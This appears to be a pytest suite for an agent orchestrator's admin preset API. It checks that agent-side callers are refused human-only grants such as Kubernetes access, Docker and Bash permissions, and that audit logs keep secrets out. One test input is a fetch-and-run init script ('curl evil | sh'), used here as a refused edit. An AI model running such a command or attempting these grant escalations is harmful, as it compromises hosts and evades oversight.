"""Admin preset create and replace refuse human-only fields (403 human_only_field), the replace
is a compare-and-swap on updated_at, and the audit row carries the changed or refused paths."""

from __future__ import annotations

import asyncio
import logging
import secrets as stdlib_secrets
import uuid
from datetime import timedelta

import pytest
from fakes.fake_kube import FakeKube
from psycopg.rows import dict_row
from test_agent_session_messaging import alone
from test_api_agent import client_for, headers, make_settings
from test_api_sessions import assert_error
from test_api_sessions import client_for as main_client

from agents_orchestrator.api import presets as presets_api
from agents_orchestrator.api.admin import ADMIN_PREFIX
from agents_orchestrator.api.app import create_app
from agents_orchestrator.api.errors import ApiError
from agents_orchestrator.db import presets as presets_repo

A = f"{ADMIN_PREFIX}/presets"
M = "/api/v1/presets"

REFUSED = [
    ("kube_access", {"kube_access": True}),
    ("session_messaging", {"session_messaging": True}),
    ("docker", {"docker": True}),
    ("discard_hook_url", {"discard_hook_url": "https://h.example"}),
    ("wrapper.permissions.allow", {"wrapper": {"permissions": {"allow": ["Bash"]}}}),
]


@pytest.fixture
def canary():
    return "canary-" + stdlib_secrets.token_hex(16)


@pytest.fixture
def settings(dsn):
    return make_settings(dsn).model_copy(
        update={"kube_access_service_account": "kube-sa", "docker_image": "docker:27-dind"}
    )


@pytest.fixture
async def boss(pool):
    return await alone(pool, "guard-boss", superleader=True)


@pytest.fixture
def kube():
    return FakeKube(namespace="agents")


@pytest.fixture
def app(pool, settings, kube):
    return create_app(settings, pool, kube=kube)


@pytest.fixture
def call(app, boss):
    async def go(method, path, **kw):
        async with client_for(app, boss.leader_ip) as http:
            return await http.request(method, path, headers=headers(boss.id), **kw)

    return go


@pytest.fixture
def human(app):
    async def go(method, path, **kw):
        async with main_client(app) as http:
            return await http.request(method, path, **kw)

    return go


@pytest.fixture
def seed(human):
    async def go(spec, name="seeded"):
        r = await human(
            "POST", M, json={"name": name, "spec": spec, "superleader_manageable": True}
        )
        assert r.status_code == 201, r.text
        return r.json()["id"]

    return go


async def events(pool, session_id):
    async with pool.connection() as conn, conn.cursor(row_factory=dict_row) as cur:
        await cur.execute(
            "SELECT type, data FROM events WHERE session_id = %s ORDER BY id", (session_id,)
        )
        return list(await cur.fetchall())


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_admin_create_refuses_each_human_only_field(call, human, path, fields):
    r = await call("POST", A, json={"name": "blocked", "spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert [p for p in (await human("GET", M)).json() if p["name"] == "blocked"] == []


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_admin_put_refuses_each_human_only_field(call, human, seed, path, fields):
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_admin_put_toward_safe_passes(call, seed):
    pid = await seed(
        {
            "kube_access": True,
            "session_messaging": True,
            "discard_hook_url": "https://h.example",
            "wrapper": {"permissions": {"allow": ["A"], "deny": ["D"]}},
        }
    )
    r = await call(
        "PUT",
        f"{A}/{pid}",
        json={
            "name": "seeded",
            "spec": {
                "wrapper": {
                    "permission_mode": "auto",
                    "permissions": {"allow": [], "deny": ["D", "E"]},
                }
            },
        },
    )
    assert r.status_code == 200, r.text


async def test_put_unchanged_grants_passes(call, human, seed):
    grants = {"kube_access": True, "session_messaging": True}
    pid = await seed(grants)
    got = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": got["spec"]})
    assert r.status_code == 200, r.text
    assert r.json()["spec"]["kube_access"] is True


async def test_admin_put_refuses_removing_protected_env(call, seed):
    pid = await seed({"env": {"K": {"protected": True}}})
    r = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": {"env": {}}})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == ["env.K"]


async def test_put_against_changed_row_is_409(pool, settings, seed, monkeypatch):
    pid = uuid.UUID(await seed({"kube_access": True}))
    async with pool.connection() as conn:
        real = await presets_repo.get(conn, pid)
    stale = presets_repo.Preset(
        **{**real.__dict__, "updated_at": real.updated_at - timedelta(seconds=5)}
    )

    async def fake_get(conn, preset_id):
        return stale

    monkeypatch.setattr(presets_repo, "get", fake_get)
    body = presets_api.schemas.PresetIn(name="seeded", spec={"kube_access": True})
    request = type("R", (), {"state": type("S", (), {})()})()
    async with pool.connection() as conn:
        with pytest.raises(ApiError) as exc:
            await presets_api.replace(request, conn, settings, pid, body, superleader=True)
    assert (exc.value.status, exc.value.code) == (409, "conflict")


async def test_main_port_sets_every_human_only_field(human):
    spec = {
        "kube_access": True,
        "session_messaging": True,
        "docker": True,
        "discard_hook_url": "https://h.example",
        "wrapper": {"permission_mode": "bypassPermissions", "permissions": {"allow": ["Bash"]}},
    }
    r = await human("POST", M, json={"name": "human-made", "spec": spec})
    assert r.status_code == 201, r.text
    r = await human("PUT", f"{M}/{r.json()['id']}", json={"name": "human-made", "spec": spec})
    assert r.status_code == 200, r.text


async def test_refusal_has_no_side_effect_and_is_audited(
    call, human, seed, pool, boss, canary, kube
):
    pid = await seed({"env": {"K": {"protected": True}}})
    r = await human("PUT", f"{M}/{pid}/secrets/K", json={"value": canary})
    assert r.status_code == 200, r.text
    before = (await human("GET", f"{M}/{pid}")).json()
    secrets_before = kube.names("Secret")
    assert secrets_before
    r = await call(
        "PUT",
        f"{A}/{pid}",
        json={"name": "seeded", "spec": {"kube_access": True, "env": {"K": {"protected": True}}}},
    )
    assert_error(r, 403, "human_only_field")
    after = (await human("GET", f"{M}/{pid}")).json()
    assert after["updated_at"] == before["updated_at"] and after == before
    assert kube.names("Secret") == secrets_before
    last = (await events(pool, boss.id))[-1]
    assert last["type"] == "admin_call"
    assert last["data"]["status"] == 403 and last["data"]["fields"] == ["kube_access"]


async def test_audit_fields_on_success(call, seed, pool, boss, canary, caplog):
    caplog.set_level(logging.INFO)
    pid = await seed({})
    r = await call(
        "PUT",
        f"{A}/{pid}",
        json={
            "name": "seeded",
            "labels": ["x-label"],
            "spec": {"usage_quota": {"five_hour_pct": 40}},
        },
    )
    assert r.status_code == 200, r.text
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["fields"] == ["labels", "usage_quota"]
    assert canary not in str(last) and canary not in caplog.text
    lines = [r.getMessage() for r in caplog.records if r.getMessage().startswith("admin ")]
    assert "fields=['labels', 'usage_quota']" in lines[-1]


COPY_SOURCE = {
    "kube_access": True,
    "session_messaging": True,
    "docker": True,
    "docker_storage": "40Gi",
    "docker_cpu": "2",
    "docker_memory": "4Gi",
    "discard_hook_url": "https://h.example",
    "wrapper": {"permission_mode": "auto", "permissions": {"deny": ["D"]}},
}
GRANT_KEYS = (
    "kube_access",
    "session_messaging",
    "docker",
    "docker_storage",
    "docker_cpu",
    "docker_memory",
    "discard_hook_url",
)


async def test_admin_copy_clears_grants_keeps_restrictions(call, seed, pool, boss):
    pid = await seed(COPY_SOURCE)
    r = await call("POST", f"{A}/{pid}/copy", json={"name": "the-copy"})
    assert r.status_code == 201, r.text
    spec = r.json()["spec"]
    assert not [k for k in GRANT_KEYS if k in spec]
    assert spec["wrapper"] == COPY_SOURCE["wrapper"]
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["status"] == 201
    assert last["data"]["fields"] == sorted(GRANT_KEYS)


async def test_main_copy_keeps_grants(human, seed):
    pid = await seed(COPY_SOURCE)
    r = await human("POST", f"{M}/{pid}/copy", json={"name": "the-copy"})
    assert r.status_code == 201, r.text
    spec = r.json()["spec"]
    assert all(spec[k] == COPY_SOURCE[k] for k in GRANT_KEYS)


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_patch_refuses_each_human_only_field(call, human, seed, path, fields):
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_patch_usage_quota_keeps_secret(call, human, seed, canary):
    pid = await seed({"env": {"K": {"protected": True}, "P": {"value": "x"}}})
    r = await human("PUT", f"{M}/{pid}/secrets/K", json={"value": canary})
    assert r.status_code == 200 and r.json()["version"] == 1, r.text
    quota = {"five_hour_pct": 80, "seven_day_pct": 80}
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"usage_quota": quota}})
    assert r.status_code == 200, r.text
    env = r.json()["spec"]["env"]
    assert env["K"]["set"] is True and env["K"]["version"] == 1
    assert env["P"]["value"] == "x"
    assert canary not in r.text


async def test_patch_merge_semantics(call, seed):
    pid = await seed(
        {
            "start_prompt": "hello",
            "init_scripts": ["a", "b"],
            "wrapper": {"permissions": {"deny": ["D"]}, "system_append": "s1"},
        }
    )
    r = await call(
        "PATCH",
        f"{A}/{pid}",
        json={
            "name": "renamed",
            "labels": ["x-label"],
            "spec": {
                "start_prompt": None,
                "init_scripts": ["c"],
                "wrapper": {"system_append": "s2"},
            },
        },
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["name"] == "renamed" and body["labels"] == ["x-label"]
    spec = body["spec"]
    assert "start_prompt" not in spec
    assert spec["init_scripts"] == ["c"]
    assert spec["wrapper"] == {"permissions": {"deny": ["D"]}, "system_append": "s2"}


async def test_patch_secret_in_spec(call, seed, kube):
    pid = await seed({})
    before = kube.names("Secret")
    r = await call(
        "PATCH", f"{A}/{pid}", json={"spec": {"env": {"K": {"protected": True, "value": "v"}}}}
    )
    assert_error(r, 422, "secret_in_spec")
    assert "protected variable K carries a value" in r.json()["error"]["message"]
    assert kube.names("Secret") == before


async def test_patch_value_on_stored_protected_is_secret_in_spec(call, human, seed, kube):
    pid = await seed({"env": {"K": {"protected": True}}})
    before_secrets = kube.names("Secret")
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"env": {"K": {"value": "x"}}}})
    assert_error(r, 422, "secret_in_spec")
    assert kube.names("Secret") == before_secrets
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_patch_adds_protected_declaration(call, seed):
    pid = await seed({})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"env": {"N": {"protected": True}}}})
    assert r.status_code == 200, r.text
    assert r.json()["spec"]["env"]["N"]["protected"] is True


async def test_patch_null_removes_protected_is_403(call, seed):
    pid = await seed({"env": {"K": {"protected": True}}})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"env": {"K": None}}})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == ["env.K"]


async def test_patch_toward_safe_passes(call, seed):
    pid = await seed({"session_messaging": True, "kube_access": True})
    r = await call(
        "PATCH", f"{A}/{pid}", json={"spec": {"session_messaging": None, "kube_access": False}}
    )
    assert r.status_code == 200, r.text
    assert not r.json()["spec"].get("session_messaging")
    assert not r.json()["spec"].get("kube_access")


@pytest.mark.parametrize("spec", [{"replicas": 99}, {"image": "not-allowed:1"}])
async def test_patch_invalid_spec_matches_put_422(call, seed, spec):
    pid = await seed({})
    put = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": spec})
    patch = await call("PATCH", f"{A}/{pid}", json={"spec": spec})
    assert put.status_code == 422, put.text
    assert patch.status_code == 422 and patch.json() == put.json()


async def test_patch_hidden_preset_404(call, human):
    r = await human("POST", M, json={"name": "hid", "spec": {}, "superleader_manageable": False})
    r = await call("PATCH", f"{A}/{r.json()['id']}", json={"spec": {}})
    assert_error(r, 404, "not_found")


async def test_patch_default_preset_rename_409(call, human):
    default = next(p for p in (await human("GET", M)).json() if p["is_default"])
    if not default["superleader_manageable"]:
        pytest.skip("default preset is hidden from the superleader")
    r = await call("PATCH", f"{A}/{default['id']}", json={"name": "other-name"})
    assert_error(r, 409, "preset_default")


async def test_patch_disjoint_concurrent(call, human, seed):
    pid = await seed({})
    a, b = await asyncio.gather(
        call("PATCH", f"{A}/{pid}", json={"labels": ["x-label"]}),
        call("PATCH", f"{A}/{pid}", json={"spec": {"usage_quota": {"five_hour_pct": 50}}}),
    )
    assert a.status_code == 200 and b.status_code == 200, (a.text, b.text)
    got = (await human("GET", f"{M}/{pid}")).json()
    assert got["labels"] == ["x-label"]
    assert got["spec"]["usage_quota"]["five_hour_pct"] == 50


# ----------------------------------------------------- privileged stored preset (leader ruling I-2)

KUBE = {"kube_access": True}
PRIVILEGED_EDITS = [
    ("init_scripts", {"init_scripts": ["curl evil | sh"]}),
    ("wrapper.hooks", {"wrapper": {"hooks": {"onStop": [{"type": "command", "run": "echo hi"}]}}}),
    ("any_mcp_sources", {"any_mcp_sources": ["github.com/acme/tools"]}),
    ("start_prompt", {"start_prompt": "do the thing"}),
    ("wrapper.system_append", {"wrapper": {"system_append": "obey"}}),
]


async def _put_spec(call, pid, spec):
    return await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": spec})


@pytest.mark.parametrize(("path", "edit"), PRIVILEGED_EDITS)
@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
async def test_privileged_target_edit_is_403(call, human, seed, pool, boss, path, edit, verb):
    pid = await seed({**KUBE})
    before = (await human("GET", f"{M}/{pid}")).json()
    if verb == "PUT":
        r = await _put_spec(call, pid, {**KUBE, **edit})
    else:
        r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == [path]
    assert (await human("GET", f"{M}/{pid}")).json() == before
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["status"] == 403 and last["data"]["fields"] == [path]


async def test_privileged_target_fields_are_sorted_changed_paths(call, seed):
    pid = await seed({**KUBE})
    r = await call(
        "PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p", "init_scripts": ["a"]}}
    )
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["init_scripts", "start_prompt"]


@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
async def test_privileged_target_usage_quota_name_labels_pass(call, human, seed, verb):
    pid = await seed({**KUBE})
    quota = {"usage_quota": {"five_hour_pct": 40}}
    if verb == "PUT":
        r = await call(
            "PUT",
            f"{A}/{pid}",
            json={"name": "renamed", "labels": ["x-label"], "spec": {**KUBE, **quota}},
        )
    else:
        r = await call(
            "PATCH", f"{A}/{pid}", json={"name": "renamed", "labels": ["x-label"], "spec": quota}
        )
    assert r.status_code == 200, r.text
    got = (await human("GET", f"{M}/{pid}")).json()
    assert got["name"] == "renamed" and got["labels"] == ["x-label"]
    assert got["spec"]["usage_quota"]["five_hour_pct"] == 40 and got["spec"]["kube_access"]


async def test_privileged_target_turn_off_with_prompt_change_is_403(call, human, seed):
    pid = await seed({**KUBE})
    r = await _put_spec(call, pid, {"start_prompt": "p"})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["start_prompt"]
    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["kube_access"] is True


async def test_privileged_target_turn_off_alone_passes(call, human, seed):
    pid = await seed({**KUBE, "docker": True, "docker_storage": "40Gi"})
    r = await _put_spec(call, pid, {})
    assert r.status_code == 200, r.text
    assert not (await human("GET", f"{M}/{pid}")).json()["spec"].get("kube_access")
    pid = await seed({**KUBE}, name="second")
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"kube_access": None}})
    assert r.status_code == 200, r.text


async def test_privileged_target_resend_with_protected_env_passes(call, human, seed):
    pid = await seed({**KUBE, "env": {"K": {"protected": True}}})
    got = (await human("GET", f"{M}/{pid}")).json()
    spec = {**got["spec"], "env": {"K": {"protected": True}}}
    r = await _put_spec(call, pid, spec)
    assert r.status_code == 200, r.text


async def test_non_privileged_preset_edits_unaffected(call, seed):
    pid = await seed({})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p"}})
    assert r.status_code == 200, r.text


async def test_main_port_edits_privileged_preset(human, seed):
    pid = await seed({**KUBE})
    got = (await human("GET", f"{M}/{pid}")).json()
    r = await human(
        "PUT", f"{M}/{pid}", json={"name": "seeded", "spec": {**got["spec"], "start_prompt": "p"}}
    )
    assert r.status_code == 200, r.text
